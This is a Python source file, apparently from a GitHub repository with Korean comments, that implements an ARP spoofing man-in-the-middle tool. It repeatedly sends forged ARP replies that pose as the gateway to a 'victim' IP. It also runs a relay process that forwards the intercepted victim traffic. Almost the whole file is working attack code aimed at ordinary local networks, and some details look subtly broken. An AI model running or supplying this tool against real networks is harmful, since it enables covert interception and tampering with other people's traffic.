# coding=utf-8
# https://github.com/Kcrong/python-send-arp/blob/master/main.py
"""
Writer Kcrong

python3 main.py [victim ip]
"""

import os
import re
import subprocess
import time
from binascii import hexlify
from multiprocessing import Process
from os import popen
from socket import *
from struct import unpack
from sys import argv

from cleaner import error_clean

from packet_header_define import *


class ARP:
    @error_clean
    def run(self):
        while True:
            self.send_arp(ARP_REPLY_OP)
            time.sleep(self.target_arp_refresh_interval)

    @staticmethod
    def get_headers(packet):
        """
        패킷에서 ethernet 헤더와 IP+ARP 부분 헤더를 파싱해 반환
        :param packet: Raw-packet bytes
        :return: ethernet header, arp+ip header
        """
        return unpack("!6s6s2s", packet[0][0:14]), unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])

    @staticmethod
    def analysis_header(header):
        """
        Hex 형태의 헤더를 필요한 정보만 파싱하여 Dict 로 반환
        :param header: unhexlify header info
        :return: Header info dict
        """
        # if ethernet header
        if len(header) == 3:
            return {
                'src_mac': hexlify(header[1]),
                'dst_mac': hexlify(header[0]),
                'type': hexlify(header[2])
            }
        # if arp header
        else:
            return {
                'src_ip': inet_ntoa(header[6]),
                'src_mac': hexlify(header[5]),
                'dst_ip': inet_ntoa(header[8]),
                'dst_mac': hexlify(header[7])
            }

    @staticmethod
    def pretty_mac(mac):
        """
        Hex 상태의 맥주소를 읽기 편한 형태의 문자열로 바꿔주는 함수
        :param mac: unhexlify mac address
        :return: pretty str-ed mac address Ex) 11:22:33:44:55:66
        """
        unpacked = hexlify(mac).decode('utf-8')
        return ":".join([i + j for i, j in zip(unpacked[::2], unpacked[1::2])])

    def __init__(self, victim):
        self.victim_ip = victim
        self.gateway_ip = self._get_gateway_ip()
        self.name, self.ip, self.mac = self._get_my_interface_info()
        # self.target_arp_refresh_interval = self.calc_arp_refresh()
        self.target_arp_refresh_interval = 3
        print("Finish calc Target's ARP refresh time. %f" % self.target_arp_refresh_interval)
        self.victim_mac = self._get_mac(self.victim_ip)
        print("Get Victim's MAC address")
        self.gateway_mac = self._get_mac(self.gateway_ip)
        print("Get Gateway MAC address")

    def _get_my_interface_info(self):
        """
        target_ip 와 연결된 인터페이스의 정보를 가져옴

        :return: ip address that connect with victim
        """

        s = socket(AF_INET, SOCK_DGRAM)
        s.connect((self.victim_ip, 219))  # 219 is ARP port
        my_ip = s.getsockname()[0]
        s.close()

        name, mac = self._get_interface_info(my_ip)

        return name, my_ip, mac

    def calc_arp_refresh(self):
        """
        Victim 의 ARP table 갱신 주기를 계산후, 그 시간을 반환
        :return: refresh interval time (float)
        """
        print("Calculate Victim's ARP table Refresh interval")

        time_list = list()

        self.send_arp(ARP_REQUEST_OP)

        s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
        s.bind((self.name, SOCK_RAW))
        while True:
            if len(time_list) == 2:
                break
            ether, ip = self.get_headers(s.recvfrom(4096))

            ip_data = self.analysis_header(ip)

            # if not ARP, Go away
            if ether[2] != ARP_TYPE_ETHERNET_PROTOCOL:
                continue

            elif ip_data['src_ip'] == self.victim_ip and ip_data['dst_ip'] == self.gateway_ip:
                time_list.append(time.time())

        # After get time
        return time_list[1] - time_list[0]

    @staticmethod
    def _get_gateway_ip():
        """
        route -n 명령어에서 Gateway 아이피를 파싱 후 반환
        :return: Gateway IP addr
        """
        output = popen("""route -n | grep 'UG[ \t]' | awk '{print $2}'""").read()
        return output.split()[0]

    @staticmethod
    def _get_interface_info(ip):
        """
        아이피를 인자로 받아 해당 아이피를 가진 인터페이스의 이름을 반환

        :param ip: ip to find interface
        :return: interface info that has ip
        """

        name_pattern = "^(\w+)\s"
        # mac_addr_pattern = ".*?HWaddr[ ]([0-9A-Fa-f:]{17})"
        ip_addr_pattern = ".*?\n\s+inet[ ]addr:((?:\d+\.){3}\d+)"
        #       pattern = re.compile("".join((name_pattern, mac_addr_pattern, ip_addr_pattern)),
        pattern = re.compile("".join((name_pattern, ip_addr_pattern)),
                             flags=re.MULTILINE)

        # 정규식을 이용해 ifconfig 명령어 결과를 파싱
        ifconfig_result = subprocess.check_output("ifconfig").decode()
        interfaces = pattern.findall(ifconfig_result)

        for name, ip_addr in interfaces:
            if ip == ip_addr:
                # 구한 Interface 이름을 이용해 MAC 주소를 raw socket 을 이용해 convert 된 값을 가져옴
                s = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)
                s.bind((name, SOCK_RAW))
                return name, s.getsockname()[4]

        # 해당 아이피를 가진 인터페이스가 없으면 False 반환
        return False

    @staticmethod
    def _packing_ip(ip):
        """
        우리가 사용하는 String Format ( "123.123.123.123" ) 을 Big-endian 으로 packing 해주는 함수

        :param ip: ip to packing big-endian
        :return: packed ip with big-endian
        """
        return pack('!4B', *[int(ip) for ip in ip.split('.')])

    def send_arp(self, send_type):
        """
        send_type 에 따라 target_ip에 arp 패킷을 전송합니다.
            ARP_REQUEST_OP: target_ip 에게 ARP 질의 패킷을 전송합니다.
            ARP_REPLY_OP: gateway_ip 를 송신자로 위조한 ARP 응답 패킷을 target_ip 에게 전송합니다.

        :param send_type: Request 나 Receive 에 대한 Opcodes.

        :return: None. Just send packet
        """

        target_mac = ZERO_MASK

        s = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)
        s.bind((self.name, SOCK_RAW))

        packed_target_ip = self._packing_ip(self.victim_ip)
        packed_target_mac = target_mac

        # REQUEST packet
        if send_type == ARP_REQUEST_OP:
            print("Send ARP Request packet")
            packed_sender_mac = self.mac
            packed_sender_ip = self._packing_ip(self.ip)

        else:
            print("Send ARP Reply packet")
            packed_sender_ip = self._packing_ip(self.gateway_ip)

            # My Spoofing Trick~
            packed_sender_mac = self.mac

        packet_frame = [
            # # Ethernet Frame
            # Dest MAC
            BROADCAST_MASK,

            # Src MAC
            packed_sender_mac,

            # Protocol type
            ARP_TYPE_ETHERNET_PROTOCOL,

            # ############################################
            # # ARP
            ARP_PROTOCOL_TYPE,

            # ARP type
            send_type,

            # Sender MAC addr
            packed_sender_mac,

            # Sender IP addr
            packed_sender_ip,

            # Target MAC addr
            packed_target_mac,

            # Target IP addr
            packed_target_ip

            # Done!
        ]

        # GOGOGO!
        # Just byte code
        s.send(b''.join(packet_frame))
        s.close()

    @staticmethod
    def _get_mac(target_ip):
        """
        target_ip 의 mac 주소를 반환합니다.
        :param target_ip: target's ip address
        :return: target's mac address
        """

        # 개선 전 코드

        """
        s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))

        while True:
            packet = s.recvfrom(2048)

            ethernet_unpacked, arp_unpacked = self.get_headers(packet)

            src_ip = inet_ntoa(arp_unpacked[6])
            mac = arp_unpacked[5]

            if ethernet_unpacked[2] != ARP_TYPE_ETHERNET_PROTOCOL:
                continue

            elif src_ip == target_ip:
                return mac
        """

        # 개선 후 코드

        os.system('ping -c 1 %s' % target_ip)

        output = popen('arp -a').read()
        for host in output.split('\n'):
            ip = host.split()[1][1:-1]
            if ip == target_ip:
                return host.split()[3]


class Relay:
    def __init__(self, arp):
        self.victim_ip = arp.victim_ip
        self.mac = hexlify(arp.mac)
        self.gateway_ip = arp.gateway_ip
        self.gateway_mac = arp.gateway_mac
        self.name = arp.name

    # Semi-Class Method
    def run(self):
        """
        멀티 프로세스 환경으로 동작
        :return: None (Demon)
        """
        process = Process(target=self.relay, args=())
        process.start()

    def edit_packet(self, packet):
        """
        패킷 정보의 스푸핑된 정보를 올바른 패킷으로 변환
        :param packet: Raw-packet bytes
        :return: Edited Raw-packet bytes
        """
        arp_partition = unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
        edited_arp_partition = arp_partition[:6] + (self.gateway_mac,) + arp_partition[7:]
        packed_edited_arp_partition = pack("2s2s1s1s2s6s4s6s4s", *edited_arp_partition)

        # packet[1] 은 Interface info 므로 Send packet 에서 DROP
        return packet[0][:13] + packed_edited_arp_partition + packet[0][42:]

    def relay(self):
        """
        Redirect packet
        :return: None (Demon)
        """
        rs = socket(AF_PACKET, SOCK_RAW, htons(0x0003))  # receive_socket
        ss = socket(AF_PACKET, SOCK_RAW, SOCK_RAW)  # send socket
        ss.bind((self.name, SOCK_RAW))
        while True:
            packet = rs.recvfrom(4096)
            eh_hex, ah_hex = ARP.get_headers(packet)

            # analyzed ip info
            ip_header = ARP.analysis_header(ah_hex)

            # 내가 날리는 ARP 패킷이면 SKIP
            if eh_hex[2] == ARP_TYPE_ETHERNET_PROTOCOL:
                continue

            # 만약 dst_ip 가 Gateway ip 이면서
            # dst_mac 이 공격자 MAC 일 경우
            # ---> 오염된 피해자의 패킷일 경우
            if ip_header['dst_ip'] == self.gateway_ip and ip_header['dst_mac'] == self.mac:
                edited_packet = self.edit_packet(packet)
                ss.send(edited_packet)  # Redirect!

        """
            print("Packet:\nSource ip: %s\nSource mac: %s\nDest ip: %s\nDest mac: %s"
                  % (
                      ip_header['src_ip'],
                      ip_header['src_mac'],
                      ip_header['dst_ip'],
                      ip_header['dst_mac'])
                  )
            print("------------------------------------")
        """


def main():
    # victim_ip = input("Victim IP: ")
    # arp = ARP(victim=argv[1])
    arp = ARP(victim='192.168.1.16')

    # 리눅스 상의 Relay를 사용하므로,
    r = Relay(arp)
    r.run()

    # target에 변조된 ARP 패킷을 보냄
    # target의 arp-table 을 변조

    arp.run()


if __name__ == '__main__':
    if len(argv) != 2:
        print("Usage: %s [victim_ip]" % argv[0])
        exit()
    else:
        main()
